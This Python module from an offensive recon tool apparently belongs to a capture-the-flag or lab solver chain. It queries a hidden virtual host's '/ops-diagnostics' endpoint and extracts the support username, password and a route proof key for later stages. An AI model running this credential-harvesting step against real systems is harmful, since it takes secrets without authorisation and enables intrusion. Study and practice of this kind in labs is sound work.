"""
Authentication Discovery Module.

Retrieves operational diagnostics exposed by the hidden virtual host
and extracts authentication credentials for subsequent discovery.
"""

from __future__ import annotations

import json
from argparse import Namespace

from recon.adapters import VHostAdapter


class AuthenticationDiscovery:
    """
    Authentication discovery component.
    """

    def __init__(self):
        self._adapter = VHostAdapter()

    def execute(
        self,
        arguments: Namespace,
        virtual_host_results: dict,
        line_protocol_results: dict | None = None,
    ) -> dict:
        """
        Discover credentials from the diagnostics endpoint.

        Parameters
        ----------
        arguments : Namespace
            Parsed CLI arguments.

        virtual_host_results : dict
            Output from VirtualHostDiscovery.

        line_protocol_results : dict, optional
            Output from LineProtocolDiscovery.

        Returns
        -------
        dict
            Authentication discovery results.
        """

        host = getattr(arguments, "host", None)

        if host is None:
            host = arguments.target

        port = getattr(arguments, "web_port", None)

        if port is None:
            port = getattr(arguments, "port", 80)

        discovered_hosts = virtual_host_results.get(
            "virtual_hosts",
            [],
        )

        if not discovered_hosts:

            return {
                "success": False,
                "reason": "No virtual host discovered.",
            }

        #
        # Use the first discovered virtual host.
        #

        virtual_host = discovered_hosts[0]["virtual_host"]

        #
        # Extract route proof from the line protocol.
        #

        route_key = None

        if line_protocol_results:

            commands = line_protocol_results.get(
                "commands",
                {},
            )

            route = commands.get(
                "ROUTE",
                "",
            )

            for item in route.split(";"):

                item = item.strip()

                if item.startswith("proof="):

                    route_key = item.split(
                        "=",
                        1,
                    )[1].strip()

        #
        # Request diagnostics.
        #

        response = self._adapter.execute(
            host=host,
            port=port,
            virtual_host=virtual_host,
            path="/ops-diagnostics",
        )

        if not response.get("reachable"):

            return {
                "success": False,
                "reason": "Diagnostics endpoint unreachable.",
            }

        if response.get("status_code") != 200:

            return {
                "success": False,
                "reason": f"Unexpected HTTP status {response.get('status_code')}",
                "response": response,
            }

        #
        # Parse JSON.
        #

        try:

            diagnostics = json.loads(
                response["body"]
            )

        except json.JSONDecodeError:

            return {
                "success": False,
                "reason": "Diagnostics response is not valid JSON.",
                "response": response,
            }

        return {
            "success": True,
            "virtual_host": virtual_host,
            "route_key": route_key,
            "support_user": diagnostics.get(
                "support_user"
            ),
            "support_password": diagnostics.get(
                "support_password"
            ),
            "signal_service": diagnostics.get(
                "signal_service"
            ),
            "note": diagnostics.get(
                "note"
            ),
            "diagnostics": diagnostics,
        }